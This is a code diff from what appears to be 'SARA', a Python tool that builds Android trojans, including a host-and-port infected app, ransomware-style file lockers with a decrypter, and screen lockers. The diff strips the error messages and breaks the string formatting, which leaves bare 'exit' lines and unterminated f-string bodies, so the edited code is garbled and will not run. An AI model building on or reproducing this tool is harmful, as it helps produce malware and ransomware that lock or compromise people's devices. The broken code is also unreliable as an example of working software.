@@ -314,8 +314,7 @@ class __sara__:
         apps = recompile(path)
         apps = uber_apk_signer(apps)
         upload_file(apps)
-        if not os.path.isfile(apps): exit(f'\n{sara} : sorry, failed to build \'{d}{apps}{w}\' :( \n')
-        prints(f'''
+        if not os.path.isfile(apps): exit
 {sara} : your trojan apps successfully created
          the application is saved as \'{g}{apps}{w}\'
          
@@ -356,8 +355,7 @@ class __sara__:
         ''')
         file = generate_infected_trojan(host, port, orig)
         upload_file(file)
-        if not os.path.isfile(file): exit(f'\n{sara} : sorry, failed to build \'{d}{file}{w}\' :( \n')
-        prints(f'''
+        if not os.path.isfile(file): exit
 {sara} : your trojan apps successfully created
          the application is saved as \'{g}{file}{w}\'
          
@@ -399,8 +397,7 @@ class __sara__:
         ''')
         file = genertare_file_locker(name, desc, icon)
         os.system(f'cp -r data/tmp/decrypter.apk .')
-        if not os.path.isfile(file): exit(f'\n{sara} : sorry, failed to build \'{d}{file}{w}\' :( \n')
-        prints(f'''
+        if not os.path.isfile(file): exit
 {sara} : your file locker apps successfully created
          the encrypter is saved as \'{g}{file}{w}\'
          the decrypter is saved as \'{g}decrypter.apk{w}\'
@@ -432,7 +429,8 @@ class __sara__:
          please be patient until the process is complete 
         ''')
         file = genertare_screen_locker(name, head, desc, keys, icon)
-        if not os.path.isfile(file): exit(f'\n{sara} : your screen locker apps successfully created
+        if not os.path.isfile(file): exit
+        {sara} : your screen locker apps successfully created
          the application is saved as \'{g}{file}{w}\'
          the secret key (passprhase) \'{g}{keys}{w}\'
         ''')
